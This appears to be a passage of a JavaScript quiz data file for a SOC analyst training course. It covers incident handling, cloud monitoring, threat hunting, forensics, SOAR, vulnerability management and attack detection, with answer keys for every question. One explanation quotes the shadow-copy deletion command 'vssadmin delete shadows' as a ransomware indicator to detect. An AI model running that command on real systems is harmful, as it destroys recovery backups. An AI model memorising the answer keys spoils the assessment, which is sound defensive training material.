      { id: "sap-q5-5", question: "Why use ISO/IMG as attachments?", options: ["Better compression", "Bypass Mark-of-the-Web", "Easier to create", "Smaller files"], correctAnswer: 1, explanation: "Files inside ISO don't get MOTW flag, allowing execution without warnings." },
      { id: "sap-q5-6", question: "What is HTML smuggling?", options: ["Hiding HTML in images", "Base64 payloads in JavaScript that auto-download", "Compressing HTML", "Blocking HTML"], correctAnswer: 1, explanation: "HTML smuggling uses JavaScript to decode and auto-download Base64 payloads." },
      { id: "sap-q5-7", question: "First action with suspicious URL?", options: ["Click it", "Defang it", "Share in chat", "Block immediately"], correctAnswer: 1, explanation: "Always defang URLs first to prevent accidental clicking." },
      { id: "sap-q5-8", question: "What is a homoglyph attack?", options: ["Similar characters from different alphabets to spoof domains", "Encrypting domains", "Expired domains", "Long domains"], correctAnswer: 0, explanation: "Homoglyphs use visually similar characters (Cyrillic 'а' vs Latin 'a')." },
      { id: "sap-q5-9", question: "After credentials entered on phishing page?", options: ["Just monitor", "Reset passwords, revoke sessions, check forwarding rules", "Send warning", "Wait 24h"], correctAnswer: 1, explanation: "Immediate reset, session revocation, and forwarding rule check are critical." },
      { id: "sap-q5-10", question: "AutoOpen in VBA indicates?", options: ["Document auto-opens", "Macro runs when document opens", "Auto-save", "Auto-update"], correctAnswer: 1, explanation: "AutoOpen() executes VBA code automatically when the document is opened." },
      { id: "sap-q5-11", question: "What to do with phishing beyond reported email?", options: ["Delete reported only", "Purge similar emails from ALL mailboxes", "Ignore", "Forward to IT"], correctAnswer: 1, explanation: "Search for and purge all instances across all mailboxes." },
      { id: "sap-q5-12", question: "What does DMARC combine?", options: ["AV and firewall", "SPF and DKIM", "Encryption and signing", "DNS and HTTP"], correctAnswer: 1, explanation: "DMARC combines SPF and DKIM for policy-level authentication." },
      { id: "sap-q5-13", question: "What determines phishing severity?", options: ["Time of day", "Recipients, clicks, payload type, target dept", "Email length", "Sender country"], correctAnswer: 1, explanation: "Severity considers recipient count, clicks, payload type, and target sensitivity." },
      { id: "sap-q5-14", question: "Why check email forwarding rules after compromise?", options: ["Performance", "Attackers set rules to maintain access after password reset", "Storage", "Compliance"], correctAnswer: 1, explanation: "Forwarding rules let attackers keep receiving emails even after password change." },
      { id: "sap-q5-15", question: "Purpose of certificate transparency logs?", options: ["Verify SSL", "Find related domains using same cert infrastructure", "Block certs", "Create certs"], correctAnswer: 1, explanation: "CT logs reveal all certificates for a domain, discovering related phishing infrastructure." }
    ]
  },
  {
    quizId: "sap-q6",
    courseId: "soc-analyst-path",
    title: "Incident Handling Final Exam",
    description: "Comprehensive exam on incident handling, reporting, and evidence.",
    passingScore: 80,
    timeLimit: 35,
    questions: [
      { id: "sap-q6-1", question: "Correct evidence collection order?", options: ["Disk→Memory→Network", "Memory→Network→Processes→Disk→Backups", "Backups→Disk→Memory", "Network→Disk→Memory"], correctAnswer: 1, explanation: "Most volatile to least: Memory → Network → Processes → Disk → Backups." },
      { id: "sap-q6-2", question: "Hash algorithm for evidence integrity?", options: ["MD5", "CRC32", "SHA256", "Base64"], correctAnswer: 2, explanation: "SHA256 is the standard for evidence hashing in legal proceedings." },
      { id: "sap-q6-3", question: "Blameless PIR focuses on?", options: ["Who caused it", "Improving systems and processes", "Punishment", "Reducing headcount"], correctAnswer: 1, explanation: "Focus on process improvements, not individual blame." },
      { id: "sap-q6-4", question: "Active ransomware on multiple systems is?", options: ["P4", "P3", "P2", "P1 Critical"], correctAnswer: 3, explanation: "Active ransomware encryption is Critical (P1) requiring immediate response." },
      { id: "sap-q6-5", question: "Executive summary should contain?", options: ["Technical details", "What happened, impact, containment status — non-technical", "Only IOCs", "Tool list"], correctAnswer: 1, explanation: "Executive summaries are for non-technical stakeholders." },
      { id: "sap-q6-6", question: "Why not analyze original evidence?", options: ["Too slow", "Modification compromises legal admissibility", "Encrypted", "Special tools needed"], correctAnswer: 1, explanation: "Working on copies preserves integrity for legal proceedings." },
      { id: "sap-q6-7", question: "PIRs must produce?", options: ["Blame report", "Specific, assigned, deadline-driven actions", "Evaluations", "Budget requests"], correctAnswer: 1, explanation: "Concrete action items with owners and deadlines are essential." },
      { id: "sap-q6-8", question: "Incident reports should use which timezone?", options: ["Local", "UTC", "EST", "Attacker's"], correctAnswer: 1, explanation: "UTC eliminates timezone confusion across geographic locations." },
      { id: "sap-q6-9", question: "When uncertain about severity?", options: ["Wait for data", "Classify low", "Escalate UP", "Ask colleague"], correctAnswer: 2, explanation: "Escalate UP — delays in critical incidents cause more damage than false alarms." },
      { id: "sap-q6-10", question: "Chain of custody must include?", options: ["Description only", "Who, when, how, storage, every handoff with timestamps", "Just hash", "Analyst name only"], correctAnswer: 1, explanation: "Track every interaction for legal admissibility." },
      { id: "sap-q6-11", question: "Key metric after PIR improvements?", options: ["Meetings held", "Recurrence rate of same incident type", "Email volume", "Satisfaction"], correctAnswer: 1, explanation: "Recurrence rate measures whether improvements were effective." },
      { id: "sap-q6-12", question: "IOCs in reports should be?", options: ["Live and clickable", "Defanged", "Encrypted", "Hidden"], correctAnswer: 1, explanation: "Defanged IOCs prevent accidental clicks on malicious links." },
      { id: "sap-q6-13", question: "How to balance threat and impact in classification?", options: ["Only threat", "Only impact", "Matrix combining both", "All critical"], correctAnswer: 2, explanation: "Use a matrix: High threat + High impact = P1." },
      { id: "sap-q6-14", question: "P1 incident response time?", options: ["< 24h", "< 4h", "< 1h", "< 15 min"], correctAnswer: 3, explanation: "Critical incidents require immediate response within 15 minutes." },
      { id: "sap-q6-15", question: "Most damaging PIR anti-pattern?", options: ["Long meetings", "Blaming individuals", "Too many actions", "Scheduling conflicts"], correctAnswer: 1, explanation: "Blaming individuals kills reporting culture." },
      { id: "sap-q6-16", question: "Should dead ends be documented in reports?", options: ["Never", "Always — prevents repeating same work", "Only if asked", "Internal notes only"], correctAnswer: 1, explanation: "Dead ends prevent others from repeating unsuccessful investigation steps." },
      { id: "sap-q6-17", question: "Monitor compromised accounts for how long?", options: ["24h", "72h", "1 week", "1 month"], correctAnswer: 1, explanation: "Monitor at least 72 hours for delayed unauthorized access." },
      { id: "sap-q6-18", question: "PIRs should be mandatory for?", options: ["P1 only", "P1 and P2 incidents", "Only when requested", "Never"], correctAnswer: 1, explanation: "Mandatory for all P1 and P2 incidents for systematic improvement." },
      { id: "sap-q6-19", question: "Report recommendations should include?", options: ["Short-term only", "Short-term, long-term, process, and training", "Tool purchases", "Nothing if resolved"], correctAnswer: 1, explanation: "Comprehensive recommendations cover immediate, long-term, process, and training needs." },
      { id: "sap-q6-20", question: "Ultimate goal of the IR lifecycle?", options: ["Closing tickets", "Continuously improving detection, response, and prevention", "Avoiding blame", "Reducing workload"], correctAnswer: 1, explanation: "The IR lifecycle feeds lessons learned into continuous improvement." }
    ]
  },
  {
    quizId: "sap-q7",
    courseId: "soc-analyst-path",
    title: "Cloud Security Monitoring Quiz",
    description: "Test your cloud security knowledge across AWS, Azure, and container environments.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q7-1", question: "In the shared responsibility model, who is ALWAYS responsible for data security?", options: ["Cloud provider", "Customer", "Both equally", "Depends on SLA"], correctAnswer: 1, explanation: "Customers always own their data security regardless of cloud model (IaaS/PaaS/SaaS)." },
      { id: "sap-q7-2", question: "What AWS service logs all API calls?", options: ["GuardDuty", "CloudTrail", "CloudWatch", "Inspector"], correctAnswer: 1, explanation: "CloudTrail records every API call made in an AWS account for auditing and investigation." },
      { id: "sap-q7-3", question: "What does the CloudTrail event 'StopLogging' indicate?", options: ["Normal maintenance", "Defense evasion — attacker disabling audit trail", "Log rotation", "Account closure"], correctAnswer: 1, explanation: "StopLogging is a critical indicator of defense evasion — attackers disable logging to hide activity." },
      { id: "sap-q7-4", question: "What is the #1 cloud security threat according to CSA?", options: ["DDoS attacks", "Misconfiguration", "Insider threat", "Zero-day exploits"], correctAnswer: 1, explanation: "Misconfiguration (public S3 buckets, open security groups) is the most common cloud security issue." },
      { id: "sap-q7-5", question: "What does 'impossible travel' detection identify?", options: ["Flight booking fraud", "User logging in from geographically impossible locations in short time", "VPN usage", "Time zone changes"], correctAnswer: 1, explanation: "Impossible travel flags when a user authenticates from two distant locations faster than physically possible." },
      { id: "sap-q7-6", question: "Which Azure log tracks user sign-in activity?", options: ["Activity Log", "Azure AD Sign-in Logs", "NSG Flow Logs", "Diagnostic Logs"], correctAnswer: 1, explanation: "Azure AD Sign-in Logs record all authentication attempts with location, device, and risk information." },
      { id: "sap-q7-7", question: "Why is running containers as root dangerous?", options: ["Performance impact", "Container escape gives full host access", "Logging issues", "Network conflicts"], correctAnswer: 1, explanation: "If an attacker escapes a root container, they have root access to the underlying host system." },
      { id: "sap-q7-8", question: "What tool provides open-source runtime detection for containers?", options: ["kube-bench", "Falco", "Trivy", "Clair"], correctAnswer: 1, explanation: "Falco detects runtime threats in containers like unexpected shell access, network connections, and file modifications." },
      { id: "sap-q7-9", question: "What M365 operation indicates possible email compromise persistence?", options: ["MailItemsAccessed", "New-InboxRule with forwarding", "FileDownloaded", "UserLoggedIn"], correctAnswer: 1, explanation: "Creating inbox forwarding rules allows attackers to maintain access to emails even after password reset." },
      { id: "sap-q7-10", question: "What GuardDuty finding indicates crypto mining?", options: ["UnauthorizedAccess", "Recon:PortProbe", "CryptoCurrency:EC2/BitcoinTool", "Trojan:DNSExfiltration"], correctAnswer: 2, explanation: "GuardDuty specifically detects cryptocurrency mining activity on EC2 instances." },
      { id: "sap-q7-11", question: "First response to compromised AWS access keys?", options: ["Delete the user", "Disable the access keys and revoke sessions", "Change the password", "Stop all EC2 instances"], correctAnswer: 1, explanation: "Immediately disable compromised access keys and revoke active sessions to stop unauthorized access." },
      { id: "sap-q7-12", question: "What Kubernetes resource gives full cluster access?", options: ["Pod", "Service", "ClusterRole: cluster-admin", "ConfigMap"], correctAnswer: 2, explanation: "The cluster-admin ClusterRole grants unrestricted access to all resources in the Kubernetes cluster." },
      { id: "sap-q7-13", question: "What is OAuth app consent phishing?", options: ["Stealing OAuth tokens", "Tricking users into granting malicious apps permissions", "OAuth server attack", "Token expiration"], correctAnswer: 1, explanation: "Attackers create malicious OAuth apps that request broad permissions (mail.read, files.readwrite) via consent phishing." },
      { id: "sap-q7-14", question: "Which cloud detection monitors for public storage exposure?", options: ["Data volume anomaly", "S3/Blob bucket policy monitoring", "DNS monitoring", "CPU usage alert"], correctAnswer: 1, explanation: "Monitoring bucket/container policies for public access prevents accidental data exposure." },
      { id: "sap-q7-15", question: "What does VPC Flow Logs capture?", options: ["Application data", "IP traffic metadata (source, dest, ports, action)", "File transfers", "Database queries"], correctAnswer: 1, explanation: "VPC Flow Logs capture network traffic metadata including source/destination IPs, ports, and allow/deny actions." }
    ]
  },
  {
    quizId: "sap-q8",
    courseId: "soc-analyst-path",
    title: "Threat Intelligence & Hunting Quiz",
    description: "Assess threat intel lifecycle, IOC management, and hunting methodology skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q8-1", question: "How many phases are in the threat intelligence lifecycle?", options: ["4", "5", "6", "7"], correctAnswer: 2, explanation: "The 6 phases: Planning & Direction, Collection, Processing, Analysis, Dissemination, Feedback." },
      { id: "sap-q8-2", question: "What is STIX?", options: ["A firewall protocol", "A structured language for describing cyber threat intelligence", "A SIEM platform", "An encryption standard"], correctAnswer: 1, explanation: "STIX (Structured Threat Information eXpression) is the standard JSON format for threat intelligence." },
      { id: "sap-q8-3", question: "What does TAXII provide?", options: ["Threat analysis", "Automated transport/sharing of STIX intelligence", "Malware sandboxing", "Vulnerability scanning"], correctAnswer: 1, explanation: "TAXII defines how STIX data is shared between organizations via REST APIs." },
      { id: "sap-q8-4", question: "Typical IOC expiration for IP addresses?", options: ["7 days", "30 days", "1 year", "Never"], correctAnswer: 1, explanation: "IP addresses change frequently — 30 days is a typical expiration before they may be reassigned to legitimate use." },
      { id: "sap-q8-5", question: "What distinguishes threat hunting from detection?", options: ["Hunting uses better tools", "Hunting is proactive, detection is reactive", "Hunting is automated", "Detection is manual"], correctAnswer: 1, explanation: "Hunting proactively searches for threats that bypass automated detections, while detection waits for alerts." },
      { id: "sap-q8-6", question: "A hunting hypothesis should be?", options: ["Vague and broad", "Testable with available data sources", "Always confirmed", "Based only on intuition"], correctAnswer: 1, explanation: "Good hypotheses are specific, testable with available data, and based on threat intelligence or ATT&CK gaps." },
      { id: "sap-q8-7", question: "What is 'stacking' in threat hunting?", options: ["Building infrastructure", "Frequency analysis — counting occurrences to find rare values", "Layering defenses", "Log aggregation"], correctAnswer: 1, explanation: "Stacking counts occurrences and sorts by frequency — rare values at the bottom often indicate threats." },
      { id: "sap-q8-8", question: "How to detect C2 beaconing?", options: ["Check file hashes", "Analyze connection interval consistency (low jitter)", "Monitor CPU usage", "Scan for open ports"], correctAnswer: 1, explanation: "C2 beaconing has regular intervals with low jitter (variation), which is detectable through statistical analysis." },
      { id: "sap-q8-9", question: "What is tactical threat intelligence?", options: ["Strategic business context", "IOCs and TTPs for immediate detection by SOC analysts", "Geopolitical analysis", "Budget planning"], correctAnswer: 1, explanation: "Tactical intelligence includes specific IOCs and TTPs that analysts can immediately use for detection." },
      { id: "sap-q8-10", question: "What should a hunt report always include?", options: ["Only findings", "Hypothesis, methodology, findings, and recommendations", "Just IOCs", "Executive summary only"], correctAnswer: 1, explanation: "Complete hunt reports document the hypothesis, data sources, methodology, findings, and operationalized detections." },
      { id: "sap-q8-11", question: "What is 'long tail analysis'?", options: ["Tracking long-running processes", "Focusing on the rare 2% of events outside the top common items", "Analyzing network latency", "Log retention policy"], correctAnswer: 1, explanation: "Long tail analysis focuses on rare events (the 2%) that fall outside common patterns — where threats often hide." },
      { id: "sap-q8-12", question: "Best source for hunting hypotheses?", options: ["Random guessing", "Threat intelligence reports and ATT&CK gaps", "Vendor marketing", "Social media"], correctAnswer: 1, explanation: "Threat intelligence and MITRE ATT&CK coverage gaps provide evidence-based starting points for hunts." },
      { id: "sap-q8-13", question: "What indicates 3+ standard deviations in data transfer?", options: ["Normal variation", "Statistical anomaly requiring investigation", "System error", "Scheduled backup"], correctAnswer: 1, explanation: "3+ standard deviations from the mean is statistically unusual and warrants investigation for data exfiltration." },
      { id: "sap-q8-14", question: "How often should baselines be rebuilt?", options: ["Never", "Monthly", "Yearly", "Only after incidents"], correctAnswer: 1, explanation: "Monthly baseline rebuilds account for organic changes while keeping detection relevant." },
      { id: "sap-q8-15", question: "What should hunting findings be converted into?", options: ["Deleted", "Automated detection rules for continuous monitoring", "Manual checks", "Reports only"], correctAnswer: 1, explanation: "Operationalizing findings into automated detection rules ensures the same technique is caught in the future." }
    ]
  },
  {
    quizId: "sap-q9",
    courseId: "soc-analyst-path",
    title: "Digital Forensics Assessment",
    description: "Evaluate disk forensics, timeline analysis, and anti-forensics detection skills.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      { id: "sap-q9-1", question: "Correct order of the forensic process?", options: ["Collection, Analysis, Identification", "Analysis, Preservation, Presentation", "Identification, Preservation, Collection, Analysis, Presentation", "Presentation, Collection, Analysis"], correctAnswer: 2, explanation: "The forensic process follows: Identification → Preservation → Collection → Analysis → Presentation." },
      { id: "sap-q9-2", question: "Most volatile evidence type?", options: ["Disk data", "CPU registers and memory", "Backup tapes", "Log files"], correctAnswer: 1, explanation: "CPU registers and memory are the most volatile — they're lost in seconds when power is removed." },
      { id: "sap-q9-3", question: "What hash algorithm is standard for evidence integrity?", options: ["MD5", "CRC32", "SHA-256", "Base64"], correctAnswer: 2, explanation: "SHA-256 is the forensic standard for evidence integrity verification in legal proceedings." },
      { id: "sap-q9-4", question: "What is the NTFS Master File Table ($MFT)?", options: ["A disk encryption key", "Database containing metadata for every file on the volume", "Network routing table", "Memory allocation table"], correctAnswer: 1, explanation: "The $MFT stores metadata (timestamps, size, location, permissions) for every file and directory on NTFS." },
      { id: "sap-q9-5", question: "How to detect timestomping?", options: ["Check file size", "Compare $STANDARD_INFORMATION vs $FILE_NAME timestamps", "Run antivirus", "Check file extension"], correctAnswer: 1, explanation: "$SI timestamps are easily modified but $FN timestamps are harder to change — discrepancy indicates timestomping." },
      { id: "sap-q9-6", question: "What Windows Event ID indicates Security log was cleared?", options: ["4624", "4688", "1102", "7045"], correctAnswer: 2, explanation: "Event ID 1102 is generated when the Windows Security audit log is cleared." },
      { id: "sap-q9-7", question: "What is a super timeline?", options: ["A very long timeline", "Timeline combining timestamps from 100+ artifact sources", "A project management tool", "Real-time event stream"], correctAnswer: 1, explanation: "A super timeline merges timestamps from file system, event logs, registry, browser, and more into one view." },
      { id: "sap-q9-8", question: "What tool creates super timelines?", options: ["Wireshark", "Plaso/log2timeline", "Nmap", "Burp Suite"], correctAnswer: 1, explanation: "Plaso (log2timeline) extracts timestamps from 100+ sources and creates comprehensive super timelines." },
      { id: "sap-q9-9", question: "What survives secure file deletion?", options: ["The file data", "Nothing at all", "USN Journal entries and Prefetch files", "Only the filename"], correctAnswer: 2, explanation: "USN Journal records the deletion event, and Prefetch records execution of the deletion tool." },
      { id: "sap-q9-10", question: "What is an Alternate Data Stream (ADS)?", options: ["Network protocol", "Hidden data stream attached to NTFS files", "Backup format", "Encryption method"], correctAnswer: 1, explanation: "NTFS ADS allows hiding data within existing files — attackers use them to conceal malicious payloads." },
      { id: "sap-q9-11", question: "What should you NEVER do with original evidence?", options: ["Hash it", "Document it", "Analyze it directly", "Photograph it"], correctAnswer: 2, explanation: "Always create working copies — analyzing original evidence risks modification that destroys legal admissibility." },
      { id: "sap-q9-12", question: "What does the $UsnJrnl artifact record?", options: ["User logins", "File creates, deletes, renames, and modifications", "Network connections", "Registry changes"], correctAnswer: 1, explanation: "The USN (Update Sequence Number) Journal records all file system changes including creates, deletes, and renames." },
      { id: "sap-q9-13", question: "Best approach for timeline analysis?", options: ["Start from the beginning of time", "Start from known events and expand outward", "Only look at the last 24 hours", "Random sampling"], correctAnswer: 1, explanation: "Pivot from known events (malware detection, alert time) and expand outward to build the full picture." },
      { id: "sap-q9-14", question: "How does fileless malware evade disk forensics?", options: ["Encrypts the disk", "Operates entirely in memory without writing to disk", "Uses very small files", "Hides in system folders"], correctAnswer: 1, explanation: "Fileless malware loads and executes in memory, leaving no traditional file-based artifacts for disk forensics." },
      { id: "sap-q9-15", question: "Key principle of anti-forensics detection?", options: ["Attackers always succeed", "Anti-forensics creates its own artifacts — the cover-up leaves traces", "Evidence cannot be recovered", "Only advanced tools can detect it"], correctAnswer: 1, explanation: "The act of destroying evidence (clearing logs, timestomping, secure deletion) creates new artifacts that analysts can find." }
    ]
  },
  // MODULE 10: SECURITY AUTOMATION & SOAR
  {
    quizId: "sap-q10",
    courseId: "soc-analyst-path",
    title: "Security Automation & SOAR Quiz",
    description: "Test your SOAR platform knowledge, playbook design, and API integration skills.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q10-1", question: "What does SOAR stand for?", options: ["Security Operations and Response", "Security Orchestration, Automation, and Response", "System Orchestration and Remediation", "Security Operations Automated Runbooks"], correctAnswer: 1, explanation: "SOAR = Security Orchestration, Automation, and Response — combining tool integration, task automation, and incident response." },
      { id: "sap-q10-2", question: "What is the recommended first step when implementing SOAR?", options: ["Automate all blocking actions", "Start with enrichment automation", "Replace all analysts with bots", "Deploy the most expensive platform"], correctAnswer: 1, explanation: "Starting with enrichment is low-risk and high-value — it speeds up analyst decisions without risk of automated blocking mistakes." },
      { id: "sap-q10-3", question: "What HTTP status code indicates API rate limiting?", options: ["401 Unauthorized", "403 Forbidden", "429 Too Many Requests", "503 Service Unavailable"], correctAnswer: 2, explanation: "HTTP 429 indicates the client has sent too many requests — implement retry with backoff when received." },
      { id: "sap-q10-4", question: "In a phishing response playbook, what should happen BEFORE automated blocking?", options: ["Notify the user", "Extract and enrich IOCs to confirm malicious intent", "Delete all emails", "Reset all passwords"], correctAnswer: 1, explanation: "IOC extraction and enrichment must confirm the email is malicious before automated blocking to avoid disrupting legitimate communications." },
      { id: "sap-q10-5", question: "What is the primary benefit of idempotent playbooks?", options: ["They run faster", "They are safe to run multiple times without unintended side effects", "They use less memory", "They don't need testing"], correctAnswer: 1, explanation: "Idempotent playbooks produce the same result regardless of how many times they run — critical for reliability in automated security response." },
      { id: "sap-q10-6", question: "Which Python library is essential for making HTTP requests to security APIs?", options: ["pandas", "requests", "matplotlib", "numpy"], correctAnswer: 1, explanation: "The requests library is the standard for HTTP API calls in Python — used for VirusTotal, CrowdStrike, and other security tool integrations." },
      { id: "sap-q10-7", question: "What metric best measures SOAR effectiveness?", options: ["Number of playbooks created", "Reduction in Mean Time to Respond (MTTR)", "API call volume", "Number of integrations"], correctAnswer: 1, explanation: "MTTR reduction directly measures how automation speeds up incident response — the core goal of SOAR implementation." },
      { id: "sap-q10-8", question: "When should a SOAR playbook escalate to a human analyst?", options: ["Never — full automation is the goal", "When the action requires judgment about business impact or is a novel threat", "Only during business hours", "After every automated action"], correctAnswer: 1, explanation: "Automation handles known scenarios; humans make judgment calls on business impact, novel threats, and high-risk containment decisions." },
      { id: "sap-q10-9", question: "What authentication method is most secure for API integrations?", options: ["Hardcoded API keys in source code", "OAuth 2.0 with token refresh and secret vault storage", "Basic auth over HTTP", "Shared passwords"], correctAnswer: 1, explanation: "OAuth 2.0 with vault-stored secrets provides secure, auditable, and rotatable authentication for API integrations." },
      { id: "sap-q10-10", question: "How can SOC automation reduce alert fatigue?", options: ["By turning off all alerts", "By auto-triaging and closing known false positives, enriching remaining alerts", "By reducing the number of security tools", "By increasing analyst headcount"], correctAnswer: 1, explanation: "Automation filters noise by auto-closing known false positives and enriching real alerts, letting analysts focus on genuine threats." },
    ]
  },
  // MODULE 11: VULNERABILITY MANAGEMENT
  {
    quizId: "sap-q11",
    courseId: "soc-analyst-path",
    title: "Vulnerability Management Quiz",
    description: "Assess vulnerability scanning, CVSS scoring, and remediation workflow knowledge.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      { id: "sap-q11-1", question: "What is the correct order of the vulnerability management lifecycle?", options: ["Patch, Scan, Report", "Discover, Assess, Prioritize, Remediate, Verify", "Scan, Fix, Forget", "Report, Scan, Remediate"], correctAnswer: 1, explanation: "The VM lifecycle is continuous: Discover/Scan → Assess/Classify → Prioritize/Plan → Remediate/Patch → Verify/Report." },
      { id: "sap-q11-2", question: "What does CVSS stand for?", options: ["Common Vulnerability Scanning System", "Common Vulnerability Scoring System", "Cyber Vulnerability Security Score", "Critical Vulnerability Status System"], correctAnswer: 1, explanation: "CVSS = Common Vulnerability Scoring System — a standardized framework for rating vulnerability severity on a 0-10 scale." },
      { id: "sap-q11-3", question: "A vulnerability has CVSS 6.1 but EPSS 0.85. How should you prioritize it?", options: ["Low priority based on CVSS", "High priority — EPSS indicates 85% exploitation probability in 30 days", "Ignore it", "Wait for vendor patch"], correctAnswer: 1, explanation: "EPSS 0.85 means 85% chance of exploitation in 30 days — this overrides the moderate CVSS score and demands urgent attention." },
      { id: "sap-q11-4", question: "What is the advantage of credentialed vulnerability scans over unauthenticated?", options: ["They are faster", "They provide deeper visibility into installed software, patches, and configurations", "They are less disruptive", "They don't require network access"], correctAnswer: 1, explanation: "Credentialed scans log into systems to check installed patches, software versions, and configurations — far more accurate than external probing." },
      { id: "sap-q11-5", question: "What is CISA KEV?", options: ["A vulnerability scanner", "A catalog of Known Exploited Vulnerabilities requiring urgent remediation", "A CVSS calculator", "A patch management tool"], correctAnswer: 1, explanation: "CISA KEV (Known Exploited Vulnerabilities) catalogs CVEs actively exploited in the wild — any CVE on the list demands immediate priority." },
      { id: "sap-q11-6", question: "When patching is not possible, what should be implemented?", options: ["Nothing — accept the risk silently", "Compensating controls like network segmentation, WAF rules, and enhanced monitoring", "Remove the system from inventory", "Disable all network access"], correctAnswer: 1, explanation: "Compensating controls (segmentation, virtual patching, monitoring) reduce risk when direct patching isn't feasible — plus documented risk acceptance." },
      { id: "sap-q11-7", question: "What is Attack Surface Management?", options: ["Managing firewall rules", "Continuous discovery and monitoring of internet-facing assets", "Employee security training", "Antivirus management"], correctAnswer: 1, explanation: "ASM continuously discovers, inventories, and monitors all external-facing assets including shadow IT and third-party services." },
      { id: "sap-q11-8", question: "What is the typical remediation SLA for a critical vulnerability?", options: ["90 days", "30 days", "24-48 hours", "1 year"], correctAnswer: 2, explanation: "Critical vulnerabilities (actively exploited, remote code execution) typically require remediation within 24-48 hours." },
      { id: "sap-q11-9", question: "How should vulnerability risk be communicated to executives?", options: ["Share raw CVSS scores", "Translate to business impact — affected customers, potential breach cost, downtime", "Send the full scan report", "Only discuss when asked"], correctAnswer: 1, explanation: "Executives need business context: customer impact, financial risk, regulatory consequences — not technical CVSS details." },
      { id: "sap-q11-10", question: "What tool is commonly used for open-source vulnerability scanning?", options: ["Nessus", "Qualys", "OpenVAS (Greenbone)", "CrowdStrike"], correctAnswer: 2, explanation: "OpenVAS (now Greenbone Community Edition) is the leading open-source vulnerability scanner with 80,000+ NVTs." },
    ]
  },
  // MODULE 12: ADVANCED ATTACK TECHNIQUES
  {
    quizId: "sap-q12",
    courseId: "soc-analyst-path",
    title: "Advanced Attack Techniques Exam",
    description: "Evaluate AD attacks, lateral movement, ransomware analysis, and purple team skills.",
    passingScore: 80,
    timeLimit: 30,
    questions: [
      { id: "sap-q12-1", question: "What Windows Event ID indicates a Kerberos service ticket request (Kerberoasting)?", options: ["4624", "4769", "7045", "1102"], correctAnswer: 1, explanation: "Event ID 4769 logs Kerberos service ticket operations — RC4 encryption type (0x17) from a single account requesting many tickets indicates Kerberoasting." },
      { id: "sap-q12-2", question: "In a Pass-the-Hash attack, what does the attacker use to authenticate?", options: ["The user's password", "The NTLM password hash directly", "A Kerberos ticket", "A session cookie"], correctAnswer: 1, explanation: "PtH uses the NTLM hash as-is for authentication — NTLM protocol accepts the hash without needing the plaintext password." },
      { id: "sap-q12-3", question: "What is a DCSync attack?", options: ["Syncing domain controllers for backup", "Mimicking DC replication to extract all password hashes from Active Directory", "A DNS cache sync", "Database synchronization"], correctAnswer: 1, explanation: "DCSync uses replication protocol permissions to request password hashes from a Domain Controller — detected via Event ID 4662." },
      { id: "sap-q12-4", question: "Which Windows Event ID records service installation (PsExec detection)?", options: ["4624", "4688", "7045", "4769"], correctAnswer: 2, explanation: "Event ID 7045 records new service installation — PsExec creates the PSEXESVC service on target machines." },
      { id: "sap-q12-5", question: "What is the first indicator of ransomware pre-encryption activity?", options: ["Ransom note appearance", "Backup deletion commands (vssadmin delete shadows)", "File encryption", "Network scanning"], correctAnswer: 1, explanation: "Attackers delete Volume Shadow Copies before encryption — detecting 'vssadmin delete shadows' is an early warning to prevent encryption." },
      { id: "sap-q12-6", question: "What was the primary attack vector in the SolarWinds supply chain attack?", options: ["Phishing emails", "Compromised software build system injecting backdoor into updates", "VPN exploitation", "USB drive"], correctAnswer: 1, explanation: "Attackers compromised SolarWinds' build system to inject the SUNBURST backdoor into legitimate Orion software updates." },
      { id: "sap-q12-7", question: "How does deception technology help detect lateral movement?", options: ["It blocks all connections", "Honey accounts and canary files generate high-fidelity alerts when accessed by attackers", "It encrypts network traffic", "It speeds up authentication"], correctAnswer: 1, explanation: "Decoy credentials, shares, and systems have no legitimate use — any interaction is a high-confidence indicator of malicious activity." },
      { id: "sap-q12-8", question: "What behavioral indicator suggests zero-day document exploitation?", options: ["User opens a PDF", "Office application spawning cmd.exe or PowerShell", "Document is emailed", "File is large"], correctAnswer: 1, explanation: "Office apps should never spawn command interpreters — Word/Excel launching cmd.exe or PowerShell strongly indicates exploit payload execution." },
      { id: "sap-q12-9", question: "What is the purpose of Atomic Red Team?", options: ["A penetration testing service", "Standardized, repeatable tests mapped to MITRE ATT&CK for validating detections", "An antivirus product", "A threat intelligence feed"], correctAnswer: 1, explanation: "Atomic Red Team provides small, focused test cases for each ATT&CK technique — enabling repeatable detection validation." },
      { id: "sap-q12-10", question: "In a purple team exercise scorecard, what three levels should be tracked per technique?", options: ["Fast, Medium, Slow", "Logged, Alerted, Blocked", "Red, Yellow, Green", "Low, Medium, High"], correctAnswer: 1, explanation: "Track whether each technique was Logged (visibility), Alerted (detection), and Blocked (prevention) to measure detection maturity." },
      { id: "sap-q12-11", question: "What percentage of ransomware victims who pay are targeted again?", options: ["10%", "30%", "~80%", "0%"], correctAnswer: 2, explanation: "Studies show approximately 80% of organizations that pay ransom are attacked again — payment signals willingness to pay." },
      { id: "sap-q12-12", question: "What is dependency confusion in supply chain attacks?", options: ["Confusing developers about dependencies", "Tricking build systems into pulling malicious public packages instead of private ones", "Using too many libraries", "Version mismatch errors"], correctAnswer: 1, explanation: "Dependency confusion publishes malicious packages on public registries with the same name as internal packages — build systems may prefer the public version." },
      { id: "sap-q12-13", question: "What defense prevents Golden Ticket attacks?", options: ["Firewall rules", "Regular KRBTGT password rotation (twice, 12+ hours apart)", "Antivirus updates", "Network segmentation"], correctAnswer: 1, explanation: "Golden Tickets are forged using the KRBTGT hash — rotating it twice invalidates all existing tickets including forged ones." },
      { id: "sap-q12-14", question: "How do you detect WMI-based lateral movement?", options: ["Check firewall logs", "Monitor wmiprvse.exe spawning unexpected child processes", "Review email logs", "Check DNS queries"], correctAnswer: 1, explanation: "Remote WMI execution causes wmiprvse.exe to spawn child processes — unexpected children like cmd.exe or PowerShell indicate lateral movement." },
      { id: "sap-q12-15", question: "What is the average dwell time for modern ransomware before encryption?", options: ["Minutes", "5-14 days", "6 months", "1 hour"], correctAnswer: 1, explanation: "Modern ransomware operators spend 5-14 days in the network performing reconnaissance, credential theft, and data exfiltration before encrypting." },
    ]
  },
  // SOC ANALYST LEARNING PATH — FINAL CERTIFICATION EXAM
  {
    quizId: "sap-q13",
    courseId: "soc-analyst-path",
    title: "SOC Analyst Certification Exam",
